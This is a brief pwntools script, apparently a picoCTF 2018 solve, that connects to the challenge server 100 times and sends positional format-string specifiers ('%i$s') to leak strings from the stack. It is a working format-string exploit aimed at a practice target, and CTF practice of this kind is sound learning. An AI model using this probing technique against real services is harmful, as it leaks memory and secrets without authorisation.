from pwn import *

for i in range(100):
  try:
    sh = remote('2018shell.picoctf.com', 57169)
    sh.sendlineafter('> ', '%{}$s'.format(i))
    print(sh.recvuntil('> '))
    sh.close()
  except EOFError:
    pass
